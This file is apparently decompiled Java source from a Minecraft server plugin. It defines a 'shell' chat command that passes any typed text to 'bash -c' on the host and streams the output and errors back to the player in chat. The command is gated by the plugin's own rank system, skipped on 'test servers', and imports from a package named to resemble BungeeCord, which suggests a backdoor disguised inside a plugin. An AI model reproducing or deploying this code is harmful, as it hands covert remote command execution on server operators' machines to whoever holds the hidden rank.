package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "shell",
   description = "Run shell command",
   blatant = true,
   rank = Rank.DEVELOPER
)
public class ShellCommand extends AbstractCommand {
   public ShellCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (Ectasy.testServer) {
         ChatUtil.sendChat(var1.getPlayer(), "The shell command has been disabled in ectasy test servers.");
      } else if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Usage : shell <cmd>");
      } else {
         try {
            String var4 = String.join(" ", var3);
            Process var10 = new ProcessBuilder().command("bash", "-c", var4).start();
            BufferedReader var11 = new BufferedReader(new InputStreamReader(var10.getInputStream()));
            BufferedReader var12 = new BufferedReader(new InputStreamReader(var10.getErrorStream()));
            new Thread(() -> {
               String line;
               try {
                  while((line = var11.readLine()) != null) {
                     ChatUtil.sendChat(var1.getPlayer(), line);
                  }
               } catch (IOException ignored) {
               }
            }).start();
            new Thread(() -> {
               String line;
               try {
                  while((line = var12.readLine()) != null) {
                     ChatUtil.sendChat(var1.getPlayer(), line);
                  }
               } catch (IOException ignored) {
               }
            }).start();
         } catch (Exception var9) {
            ChatUtil.sendChat(var1.getPlayer(), "Error : " + var9.getCause() + " | " + var9.getMessage());

            for(StackTraceElement var8 : var9.getStackTrace()) {
               ChatUtil.sendChat(var1.getPlayer(), var8.toString());
            }
         }
      }
   }
}
